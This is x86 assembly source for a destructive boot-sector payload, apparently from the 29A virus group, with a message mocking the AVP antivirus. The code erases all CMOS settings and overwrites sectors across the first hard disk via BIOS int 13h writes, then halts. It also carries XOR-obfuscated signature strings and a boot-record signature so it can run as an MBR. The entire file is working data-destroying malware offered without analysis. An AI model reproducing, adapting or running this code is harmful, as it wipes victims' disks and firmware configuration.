
;DEBUG                   equ     1


                        model   tiny
                        locals  __
                        jumps
                        p386

                        .code

                        org     100h
start:
                        cli
                        xor     bx, bx
                        mov     ss, bx
                        mov     sp, 7c00h
                        sti

                        push    cs
                        pop     ds
                        push    cs
                        pop     es

                        call    entry
entry:                  pop     bp
                        sub     bp, offset entry

                        xor     ax, ax
__c:                    mov     al, ah
                        out     70h, al
                        mov     al, 0
                IFDEF   DEBUG
                        in      al, 71h
                ELSE
                        out     71h, al
                ENDIF
                        inc     ah
                        jnz     __c

                        push    cs
                        pop     es
                        lea     bx, start[bp]

                        xor     cx, cx

__2:                    inc     ch

                        xor     dx, dx

__1:                    add     dh, 8

                IFDEF   DEBUG
                        mov     ax, 0202h
                ELSE
                        mov     ax, 0302h
                ENDIF
                        mov     cl, 2
                        mov     dl, 80h
                        int     13h

                        or      dh, dh
                        jnz     __1
                        or      ch, ch
                        jnz     __2

                        mov     ax, 0000h
                        int     10h

                        lea     si, msg[bp]
                        cld
__4:                    segcs
                        lodsb
                        or      al, al
                        jz      __3
                        mov     ah, 0Eh
                        mov     bx, 0007h
                        int     10h
                        jmp     __4
__3:
                        nop

__0:                    cli
                        hlt
                        jmp     __0

msg                     db      'You see? AVP is PIECE OF SHIT. Next time dont buy it',13,10
                        db      'kasper?-COCATb! Hehehe...Hoho..Hahahaaa...|-)' ,13,10
                        db      '[здесь могла быть Ваша реклама]',0
                        db      13,10
                        db      0

                        db      '(c) I.Daniloff/29A, (812) 592-2710',0

                        db      '(' xor 0FFh
                        db      'c' xor 0FFh
                        db      ')' xor 0FFh
                        db      'R' xor 0FFh
                        db      'e' xor 0FFh
                        db      'd' xor 0FFh
                        db      'A' xor 0FFh
                        db      'r' xor 0FFh
                        db      'c' xor 0FFh
                        db      0

                        db      'Z' xor 'T'
                        db      '0' xor 'n'
                        db      'M' xor 'x'
                        db      'B' xor '2'
                        db      'i' xor 'S'
                        db      'E' xor '.'
                        db      '/' xor 'S'
                        db      '2' xor '.'
                        db      '9' xor 'R'
                        db      'A' xor '.'
                        db      0

                        org     start + 512 - 64 - 2

                        db      80h, 0,1,0, 5, 03Fh,0FFh,0FFh, 0,0,0,0, 78h,56h,34h,12h

                        org     start + 512 - 2
                        dw      0aa55h

                        end     start
